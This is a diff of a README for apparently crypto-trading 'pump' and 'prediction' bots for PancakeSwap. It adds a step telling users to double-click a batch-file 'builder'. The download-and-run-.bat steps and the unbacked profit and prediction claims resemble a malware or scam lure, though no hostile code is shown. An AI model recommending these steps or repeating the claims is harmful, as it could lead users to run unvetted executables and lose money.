@@ -1,6 +1,7 @@
+# "Any trader can go to the moon, but only those who use the Pump bot will always stay there."
 
 # Coinsw.app - Combination of Useful Bots for Pancakeswap
-![](https://image.ibb.co/kpCga9/make_money.jpg)
+![](https://i.ibb.co/vYccRn8/IMGLUNADUMP.png)
 
 Place the buy orders under 1 second even to 0.2 second (with fast connections). 
 
@@ -32,8 +33,9 @@ pip install pynput requests ccxt==1.16.59 cryptography ws4py bs4
 1. Download the Full Repo [Github](https://github.com/CoinSwapPump/PumpDumpDedector/archive/master.zip). 
 2. Unzip ``master.zip``
 3. Double click `PredictionBotBuilder.bat` 
-4. The direction you need to play will appear on the screen that opens 1.20 minutes before each new round.
-5. Enjoy!
+4. If your current internet is of poor quality, please build the light version => `LightVersionBuilder.bat` 
+5. The direction you need to play will appear on the screen that opens 1.20 minutes before each new round.
+6. Enjoy!
 
 
 # Features
